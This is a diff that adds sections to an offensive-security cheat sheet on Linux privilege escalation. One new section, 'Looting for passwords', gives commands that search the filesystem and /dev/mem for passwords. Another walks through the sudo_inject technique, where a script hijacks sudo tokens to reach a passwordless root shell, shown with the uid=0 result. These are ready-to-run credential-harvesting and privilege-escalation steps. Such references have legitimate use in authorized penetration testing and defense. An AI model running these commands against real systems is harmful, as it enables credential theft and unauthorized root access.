@@ -13,6 +13,10 @@
 ## Summary
 
 * [Checklist](#checklist)
+* [Looting for passwords](#looting-for-passwords)
+    * [Files containing passwords](#files-containing-passwords)
+    * [Last edited files](#last-edited-files)
+    * [In memory passwords](#in-memory-passwords)
 * [Scheduled tasks](#scheduled-tasks)
     * [Cron jobs](#cron-jobs)
     * [Systemd timers](#systemd-timers)
@@ -27,6 +31,7 @@
     * [NOPASSWD](#nopasswd)
     * [LD_PRELOAD and NOPASSWD](#ld-preload-and-passwd)
     * [Doas](#doas)
+    * [sudo_inject](#sudo-inject)
 * [GTFOBins](#gtfobins)
 * [Wildcard](#wildcard)
 * [Writable /etc/passwd](#writable---etc---passwd)
@@ -110,6 +115,29 @@
   * Checks to determine if we're in a Docker container
   * Checks to see if the host has Docker installed
   * Checks to determine if we're in an LXC container
+
+## Looting for passwords
+
+### Files containing passwords
+
+```powershell
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+```
+
+### Last edited files
+
+Files that were edited in the last 10 minutes
+
+```powershell
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+```
+
+### In memory passwords
+
+```powershell
+strings /dev/mem -n10 | grep -i PASS
+```
 
 ## Scheduled tasks
 
@@ -216,7 +244,6 @@ sh-5.0# id
 uid=0(root) gid=1000(swissky)
 ```
 
-
 ## SUDO
 
 ### NOPASSWD
@@ -268,6 +295,24 @@ There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, rem
 ```bash
 permit nopass demo as root cmd vim
 ```
+
+### sudo_inject
+
+Using [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)
+
+```powershell
+$ sudo whatever
+[sudo] password for user:    
+# Press <ctrl>+c since you don't have the password. 
+# This creates an invalid sudo tokens.
+$ sh exploit.sh
+.... wait 1 seconds
+$ sudo -i # no password required :)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Slides of the presentation : [https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)
 
 ## GTFOBins
 
@@ -471,3 +516,4 @@ lxc exec mycontainer /bin/sh
 - [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
 - [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
 - [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
